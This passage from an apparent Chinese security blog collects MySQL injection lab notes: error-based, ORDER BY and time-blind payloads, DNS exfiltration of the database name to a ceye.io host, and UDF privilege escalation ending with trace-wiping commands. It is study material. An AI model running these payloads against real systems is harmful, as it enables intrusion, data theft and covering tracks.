test order by 1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | 1 | 2 | 3 | | admin | admin | 1 | +-------+----------+------+ 2 rows in set (0.00 sec) mysql> select * from test where id > 0 order by 1 limit 1 union select 1,2,3 from test; ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY 用procedure analyse进行报错注入 mysql> select * from test where id > 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~' mysql> select * from test where id > 0 order by 1 limit 1 procedure analyse(updatexml(1,concat(0x7e,(select version()),0x7e),1),1); ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select version()),0x7e),1),1)' at line 1 但是这里面解析不了select子句，Daedalus说是mysql版本问题，玩不了了 order by 注入报错 mysql> select id from test order by 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~' 时间盲注 mysql> select id from test order by (select if (1=1, sleep(1), 1) ); +------+ | id | +------+ | 1 | | 2 | +------+ 2 rows in set (2.03 sec) 返回时间有几秒就说明有几个数据，可以调整一下sleep的时间 mysql 带外注入UNC(Universal Naming Convention)UNC为网络（主要指局域网）上资源的完整 Windows 2000 名称格式为：\\servername\\sharename\\directory\\filenamemysql的load_file函数支持这种路径格式来加载外部文件，所以只能适用于windows的操作系统 原理如果本地hosts文件和本地dns解析器都没有与域名对应的映射关系，则会去查找本地dns服务器，如果本地DNS服务器本地区域文件与缓存解析都失效，且本地DNS服务器未用转发模式，本地DNS就把请求发至13台根DNS，然后按照上图依次查询。 payloadmysql> SELECT CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt'); +---------------------------------------------------------------+ | CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt') | +---------------------------------------------------------------+ | \\\\security.qlcegs.ceye.io\\abc.txt | +---------------------------------------------------------------+ 1 row in set (0.00 sec) /*前一个反斜线起转义作用*/ mysql> SELECT load_file(CONCAT('\\\\\\\\',(select database()),'.qlcegs.ceye.io\\\\abc.txt')); 在dns上看到的效果： mysql udf提权dll在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。 plugin在mysql版本&gt;5.1时，udf要求导出到mysql&#x2F;lib&#x2F;plugin目录下，且默认不存在可以使用ads流创建文件夹 select 'lib' into dumpfile 'E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib::$INDEX_ALLOCATION'; select 'plugin' into dumpfile 'E:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION'; /*自己实验失败 errcode 13 没找到解决方法*/ 创建函数可以用webshell创建plugin目录后找任意的地方上传udf.dll文件再导出到plugin目录创建函数，必须有数据库insert权限，因为操作会在mysql.func系统表中添加一行记录 select load_file(\"C:/phpStudy/PHPTutorial/WWW/udf.dll\") into dumpfile 'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'; create function shell returns string soname 'udf.dll'; 没有webshell或者上传业务的话可以这样做 select hex(load_file('c:/udf.dll')); /*得到dll的16进制*/ select unhex('udf.dll hex code') into dumpfile 'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'; create function shell returns string soname 'udf.dll'; 随后就可以来执行系统命令，还可以擦除痕迹 select shell(\"cmd\",\"net user\"); drop function shell; delete from mysql.func where name = 'shell';","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]}],"categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"},{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"},{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"},{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"},{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"},{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"},{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"},{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}